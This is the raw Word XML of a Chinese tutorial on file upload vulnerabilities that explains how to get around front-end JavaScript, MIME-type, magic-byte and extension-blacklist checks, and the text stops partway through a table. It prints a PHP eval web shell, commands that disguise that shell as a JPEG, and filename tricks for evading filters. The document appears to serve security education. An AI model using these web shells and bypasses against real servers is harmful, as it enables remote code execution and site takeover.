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F4F71" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="aa"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>文件上传漏洞</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve"> — </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>基础及过滤方式</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="62376A34" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>一、漏洞产生的前提条件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="02F24A06" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>【学习提示】文件上传漏洞是</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>Web</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:i/>
          <w:color w:val="0066CC"/>
          <w:sz w:val="20"/>
        </w:rPr>
        <w:t>安全中高危漏洞之一，成功率极高。以下内容按从易到难排列，建议按顺序逐个理解并动手实践。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="240E88B2" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>文件上传漏洞要成功利用，需同时满足以下四个条件：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5C9ED734" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>文件能够上传</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> —— </w:t>
      </w:r>
      <w:r>
        <w:t>服务器接收并保存了上传的文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="54B2BBC2" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>文件能够被服务器正常解析</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> —— </w:t>
      </w:r>
      <w:r>
        <w:t>如</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>文件被</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Apache/Nginx </w:t>
      </w:r>
      <w:r>
        <w:t>当作</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:t>脚本执行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="67D9E175" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>文件能够被执行</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> —— </w:t>
      </w:r>
      <w:r>
        <w:t>上传目录有执行权限，服务器配置允许执行脚本</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2CAB397F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>检测机制存在缺陷</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> —— </w:t>
      </w:r>
      <w:r>
        <w:t>过滤不严，导致恶意文件绕过了检查</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3FC97782" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="1"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>二、常见检测方式及绕过方法</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2EFA7CCF" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">① </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>前端</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve"> JavaScript </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5A92EF15" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：在前端通过</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> JS </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检查文件扩展名（如只允许</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> .jpg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>.png</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="51EAE952" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>绕过方法（三种）：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3C05CFD2" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>修改前端代码：</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">F12 </w:t>
      </w:r>
      <w:r>
        <w:t>打开开发者工具，找到</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> JS </w:t>
      </w:r>
      <w:r>
        <w:t>验证代码，直接删除或修改判断逻辑</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="46028DBF" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>抓包修改：先用合法后缀名通过前端验证，</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Burp Suite </w:t>
      </w:r>
      <w:r>
        <w:t>抓包后将文件名改为</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> shell.php </w:t>
      </w:r>
      <w:r>
        <w:t>再放行</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B04A5C9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="a0"/>
      </w:pPr>
      <w:r>
        <w:t>自建表单提交：自己写</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> HTML </w:t>
      </w:r>
      <w:r>
        <w:t>表单，</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">action </w:t>
      </w:r>
      <w:r>
        <w:t>指向目标上传接口，不加</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> JS </w:t>
      </w:r>
      <w:r>
        <w:t>验证，直接提交恶意文件</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="2C590236" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>自建表单示例：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DB6A48F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>&lt;form action="http://target.com/upload.php" method="post" enctype="multipart/form-data"&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="12D40514" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="file" name="file" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6AD37EF2" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">    &lt;input type="submit" value="</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>上传</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>" /&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4EB9E9F9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t>&lt;/form&gt;</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4D51CA33" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">② MIME </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>类型检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="55C6F113" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：服务端检查</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> HTTP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>请求头中的</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> Content-Type </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>字段，只允许特定类型（如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> image/jpeg</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>）。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4C1B4AFB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>绕过方法：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4E185A4C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:t>使用</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve">Burp Suite </w:t>
      </w:r>
      <w:r>
        <w:t>抓包，将请求头中的</w:t>
      </w:r>
      <w:r>
        <w:t xml:space="preserve"> Content-Type </w:t>
      </w:r>
      <w:r>
        <w:t>修改为允许的类型：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="174CEAA8" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>原始：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Type: application/x-php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="7CD2E8B9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>修改：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Content-Type: image/jpeg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="4236FC2A" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>提示：</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">MIME </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>类型只是告知接收方文件格式的一种标识，修改它不会影响文件的实际内容，因此可以轻松绕过。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5274B3F1" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t xml:space="preserve">③ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>文件头（文件幻数）检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="622818D6" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：服务端读取文件头部几个字节，检查是否为图片文件的魔数（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>Magic Number</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>）。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0279" w14:paraId="6859EB21" w14:textId="77777777" w:rsidTr="00BF0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4DC659" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>文件类型</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3DBF20CB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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文件头（十六进制）</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="51FD1689" w14:textId="77777777" w:rsidTr="00BF0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9E3398" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>JPEG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="3C2E298F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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FF D8 FF E0</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="4A11DF53" w14:textId="77777777" w:rsidTr="00BF0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565976" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>PNG</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0CB2FFF4" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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 50 4E 47</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="53CF9A19" w14:textId="77777777" w:rsidTr="00BF0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B14906" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>GIF</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="4320" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="6E4B24CC" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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47 49 46 38</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
    </w:tbl>
    <w:p w14:paraId="5E5791D0" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00BF0279"/>
    <w:p w14:paraId="6081C582" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>绕过方法：在恶意脚本文件内容前面拼接图片文件头，制作</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>图片马</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>"</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>：</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D82EA1C" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432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方法一：直接将图片头写入</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> PHP </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>文件前</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="525C24DD" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>echo -e "\xFF\xD8\xFF\xE0" &gt; shell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="33FF1351" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>echo "&lt;?php @eval(\$_POST['cmd']);?&gt;" &gt;&gt; shell.php</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5B94ECE1" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00BF0279">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="7B506780" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432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方法二：使用</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve"> copy </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>命令合并（</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>Windows</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>）</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="569F8BB1" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:ind w:left="432"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t xml:space="preserve">copy normal.jpg /b + shell.php /a </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="Consolas" w:eastAsia="Consolas" w:hAnsi="Consolas"/>
          <w:color w:val="333333"/>
          <w:sz w:val="18"/>
        </w:rPr>
        <w:t>shell.jpg</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="41BED83F" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:pPr>
        <w:pStyle w:val="21"/>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:lastRenderedPageBreak/>
        <w:t xml:space="preserve">④ </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:rFonts w:ascii="微软雅黑" w:eastAsia="微软雅黑" w:hAnsi="微软雅黑"/>
        </w:rPr>
        <w:t>后缀名黑名单检测</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="517AC5A6" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>检测方式：服务端维护一个禁止上传的后缀名列表，如</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve"> php</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>asp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>jsp</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>、</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t xml:space="preserve">exe </w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>等。</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6DFD4632" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
      <w:r>
        <w:rPr>
          <w:b/>
        </w:rPr>
        <w:t>绕过方法：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11"/>
      </w:tblGrid>
      <w:tr w:rsidR="00BF0279" w14:paraId="0F03048E" w14:textId="77777777" w:rsidTr="00BF0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7AE4A7" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>绕过方式</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="0DA29125" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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原理</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="30A6EDF1" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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示例</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="24A81709" w14:textId="77777777" w:rsidTr="00BF0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D27270" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>大小写混淆</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="017CE4AB" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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服务端未做大小写统一</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="2F5D2D85" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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.pHp</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t>.PhP</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="09D3E1DB" w14:textId="77777777" w:rsidTr="00BF0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888527" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>双扩展名</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="1369194D" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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利用服务器解析特性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="41FC5EF6" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649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shell.php.jpg</w:t>
            </w:r>
          </w:p>
        </w:tc>
      </w:tr>
      <w:tr w:rsidR="00BF0279" w14:paraId="386062D9" w14:textId="77777777" w:rsidTr="00BF0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8C43E9" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="005649BE">
            <w:r>
              <w:t>空格</w:t>
            </w:r>
            <w:r>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>点</w:t>
            </w:r>
            <w:r>
              <w:t>/</w:t>
            </w:r>
            <w:r>
              <w:t>特殊字符</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="401601B5" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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利用系统文件命名特性</w:t>
            </w:r>
          </w:p>
        </w:tc>
        <w:tc>
          <w:tcPr>
            <w:tcW w:w="2880" w:type="dxa"/>
          </w:tcPr>
          <w:p w14:paraId="274C6235" w14:textId="77777777" w:rsidR="00BF0279" w:rsidRDefault="00564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shell.php.</w:t>
            </w:r>
            <w:r>
              <w:t>、</w:t>
            </w:r>
            <w:r>
              <w:t xml:space="preserve">shell.php </w:t>
            </w:r>
          </w:p>
        </w:tc>
